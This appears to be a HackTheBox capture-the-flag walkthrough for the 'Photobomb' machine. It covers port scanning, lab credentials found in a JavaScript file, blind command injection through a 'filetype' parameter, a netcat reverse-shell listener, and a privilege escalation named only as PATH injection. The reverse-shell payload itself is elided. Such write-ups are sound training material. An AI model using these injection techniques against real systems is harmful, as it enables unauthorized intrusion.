# HackTheBox - Photobomb Walkthrough

**Author: Suvani  Basnet**


## Stage 1: Scanning the Target

### 🔍 Phase 1: Port Scanning

I began with an aggressive full port scan:

```bash
sudo nmap -A $IP_ADDRESS
```

**Result:** Two open ports.

* **Port 22** - SSH
* **Port 80** - HTTP

### 🔎 Phase 2: Service Enumeration

```bash
sudo nmap -sC -sV -Pn -n -p22,80 -T normal $IP_ADDRESS
```

**Findings:**

* **22/tcp** - OpenSSH 8.2p1
* **80/tcp** - Nginx 1.18.0

### 🗂 Add Domain to Hosts File

```bash
sudo vim /etc/hosts
```

Add:

```
<TARGET_MACHINE_IP> photobomb.htb
```

---





## Stage 2: JavaScript Credential Discovery

While inspecting `photobomb.htb`, I found a JS file: `photobomb.js`. It contained embedded credentials:

```js
pH0t0:b0Mb!
```

Logged into [http://photobomb.htb/printer](http://photobomb.htb/printer) using these creds.

---

## Stage 5: Command Injection via Burp Suite

### 📩 Download Photo Request

* Parameters: `photo`, `filetype`, `dimensions`

### 🚨 Testing Command Injection

Tried injecting `;sleep 5;` in each parameter:

* `photo` → Error: source not found
* `dimensions` → Error: invalid
* `filetype` → Delay in response ⏳

### 🤐 Blind Command Injection

Confirmed using ICMP ping + tcpdump:

```bash
ping 127.0.0.1
```

Payload (URL encoded):

```
filetype=jpg;<bash reverse shell url encoded>
```

Result: Received a shell back  — command injection confirmed.

---


### 🧏 Netcat Listener

```bash
nc -lvnp 1234
```

Connection successful — gained shell as **wizard** user.

### 🛠 Shell Stabilization

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
CTRL+Z
stty raw -echo;fg
```

📁 **User flag** found in `/home/wizard/user.txt`

---

## Stage 7: Privilege Escalation

PATH INJECTION

🎉 Got **root shell**!

📁 **Root flag** located at `/root/root.txt`

---